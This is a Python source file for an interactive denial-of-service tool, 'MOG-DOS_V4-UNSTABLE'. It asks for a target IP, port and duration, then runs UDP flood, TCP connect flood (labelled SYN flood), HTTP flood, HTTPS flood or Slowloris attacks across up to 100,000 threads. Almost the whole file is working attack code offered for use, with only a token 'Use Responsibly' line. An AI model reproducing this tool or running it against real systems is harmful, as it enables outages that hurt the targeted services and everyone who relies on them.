import socket
import threading
import time
import random
import sys
import ssl
from concurrent.futures import ThreadPoolExecutor

class Colors:
    LIGHT_PURPLE = "\033[95m"
    CYAN = "\033[96m"
    DARK_CYAN = "\033[36m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"

BANNER = f"""{Colors.RED}
███╗   ███╗ ██████╗  ██████╗       ██████╗  ██████╗ ███████╗       ██╗   ██╗██╗  ██╗
████╗ ████║██╔═══██╗██╔════╝       ██╔══██╗██╔═══██╗██╔════╝       ██║   ██║██║  ██║
██╔████╔██║██║   ██║██║  ███╗█████╗██║  ██║██║   ██║███████╗       ██║   ██║███████║
██║╚██╔╝██║██║   ██║██║   ██║╚════╝██║  ██║██║   ██║╚════██║       ╚██╗ ██╔╝╚════██║
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝      ██████╔╝╚██████╔╝███████║███████╗╚████╔╝      ██║
╚═╝     ╚═╝ ╚═════╝  ╚═════╝       ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═══╝       ╚═╝
                                                                                    
██╗   ██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗     ███████╗                
██║   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝                
██║   ██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝██║     █████╗                  
██║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔══██╗██║     ██╔══╝                  
╚██████╔╝██║ ╚████║███████║   ██║   ██║  ██║██████╔╝███████╗███████╗                
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝                {Colors.END}"""

class AttackManager:
    def __init__(self):
        self.active_attacks = 0
        self.total_packets = 0
        self.running = True

    def print_stats(self):
        while self.running:
            time.sleep(1)
            sys.stdout.write(f"\r{Colors.CYAN}Active Attacks: {self.active_attacks} | Total Packets: {self.total_packets}{Colors.END}")
            sys.stdout.flush()

attack_manager = AttackManager()

def udp_flood(target_ip, target_port, duration):
    start_time = time.time()
    bytes_to_send = random._urandom(random.randint(1024, 65500))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() - start_time < duration:
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            attack_manager.total_packets += 1
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.close()

def tcp_syn_flood(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            attack_manager.total_packets += 1
            s.close()
        except:
            pass

def http_flood(target_ip, target_port, duration):
    start_time = time.time()
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept-Language: en-US,en;q=0.5",
        "Connection: keep-alive"
    ]
    
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            request = f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\nHost: {target_ip}\r\n"
            request += "\r\n".join(headers) + "\r\n\r\n"
            s.send(request.encode())
            attack_manager.total_packets += 1
            s.close()
        except:
            pass

def https_flood(target_ip, target_port, duration):
    start_time = time.time()
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept-Language: en-US,en;q=0.5",
        "Connection: keep-alive"
    ]
    
    while time.time() - start_time < duration:
        try:
            context = ssl.create_default_context()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_sock = context.wrap_socket(s, server_hostname=target_ip)
            s_sock.connect((target_ip, target_port))
            request = f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\nHost: {target_ip}\r\n"
            request += "\r\n".join(headers) + "\r\n\r\n"
            s_sock.send(request.encode())
            attack_manager.total_packets += 1
            s_sock.close()
        except:
            pass

def slowloris(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            s.send("Content-length: 42\r\n".encode())
            
            while time.time() - start_time < duration:
                s.send("X-a: b\r\n".encode())
                attack_manager.total_packets += 1
                time.sleep(10)
        except:
            pass

def start_attack(target_ip, target_port, attack_type, duration):
    attack_manager.active_attacks += 1
    
    if attack_type == "udp":
        udp_flood(target_ip, target_port, duration)
    elif attack_type == "tcp":
        tcp_syn_flood(target_ip, target_port, duration)
    elif attack_type == "http":
        http_flood(target_ip, target_port, duration)
    elif attack_type == "https":
        https_flood(target_ip, target_port, duration)
    elif attack_type == "slowloris":
        slowloris(target_ip, target_port, duration)
    
    attack_manager.active_attacks -= 1

def main():
    print(BANNER)
    print(f"{Colors.DARK_CYAN}MOG-DOS_V4-UNSTABLE | DOS Tool | @misterofgames_yt{Colors.END}")
    print(f"{Colors.YELLOW}Thanks for using MOG-DOS_V4-UNSTABLE! | Use Responsibly{Colors.END}\n")
    
    target_ip = input(f"{Colors.GREEN}[?] Target IP: {Colors.END}")
    target_port = int(input(f"{Colors.GREEN}[?] Target Port: {Colors.END}"))
    duration = int(input(f"{Colors.GREEN}[?] Attack Duration (seconds): {Colors.END}"))
    
    print(f"\n{Colors.BLUE}Available Attack Methods:{Colors.END}")
    print(f"{Colors.YELLOW}1. UDP Flood")
    print("2. TCP SYN Flood")
    print("3. HTTP Flood")
    print("4. HTTPS Flood")
    print("5. Slowloris")
    attack_choice = input(f"\n{Colors.GREEN}[?] Select Attack Method (1-5): {Colors.END}")
    
    attack_types = {
        "1": "udp",
        "2": "tcp",
        "3": "http",
        "4": "https",
        "5": "slowloris"
    }
    
    attack_type = attack_types.get(attack_choice, "udp")
    
    print(f"\n{Colors.RED}Starting attack on {target_ip}:{target_port} using {attack_type} method...{Colors.END}")
    
    stats_thread = threading.Thread(target=attack_manager.print_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    with ThreadPoolExecutor(max_workers=100000) as executor:
        for _ in range(100000):
            executor.submit(start_attack, target_ip, target_port, attack_type, duration)
    
    print(f"\n{Colors.GREEN}Attack completed!{Colors.END}")
    attack_manager.running = False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Attack stopped by user.{Colors.END}")
        attack_manager.running = False
        sys.exit(0)